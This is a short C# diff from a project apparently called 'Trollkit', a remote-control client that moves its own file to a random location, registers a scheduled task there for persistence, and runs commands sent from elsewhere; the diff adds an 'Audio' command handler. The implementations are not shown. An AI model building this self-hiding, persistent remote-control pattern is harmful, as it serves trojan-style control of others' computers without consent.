@@ -1,12 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Input;
 using Trollkit_Client.Modules;
+using Trollkit_Client.Modules.CommandHandlers;
 using Trollkit_Library;
 using Trollkit_Library.Models;
 
@@ -36,7 +31,7 @@ namespace Trollkit_Client
 
 			Virus virus = new Virus();
 			string randomLocation = virus.FindRandomFileLocation();
-			string newFileLocation = virus.MoveFileToLocation(randomLocation);
+			string newFileLocation = "lekker";// virus.MoveFileToLocation(randomLocation);
 			BConsole.WriteLine($"New File location: {newFileLocation}");
 			new TaskSchedulerHelper().CreateTask(newFileLocation);
 
@@ -50,6 +45,7 @@ namespace Trollkit_Client
 			receiver.OnDataReceived += Receiver_OnDataReceived;
 			handlers = new Dictionary<string,ICommandHandler>();
 			handlers.Add("Task", new TaskHandler());
+			handlers.Add("Audio", new AudioHandler());
 		}
 
 		private void Receiver_OnDataReceived(TransferCommandObject Object)
